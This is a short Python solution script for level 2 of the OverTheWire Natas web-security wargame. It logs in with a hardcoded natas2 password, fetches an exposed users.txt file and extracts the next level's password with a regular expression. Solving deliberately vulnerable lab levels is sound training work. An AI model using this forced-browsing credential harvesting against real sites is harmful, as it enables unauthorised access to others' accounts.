#!/usr/bin/python3
import re
import requests

username = 'natas2'
password = 'ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi'

url = 'http://%s.natas.labs.overthewire.org' % (username)
print(url)
response = requests.get(url, auth=(username, password))

print(response.text)


users= requests.get('http://natas2.natas.labs.overthewire.org/files/users.txt', auth = (username,password))
print(users.text)
next_password = (re.findall("natas3:(.*)",users.text))[0]

print(next_password)
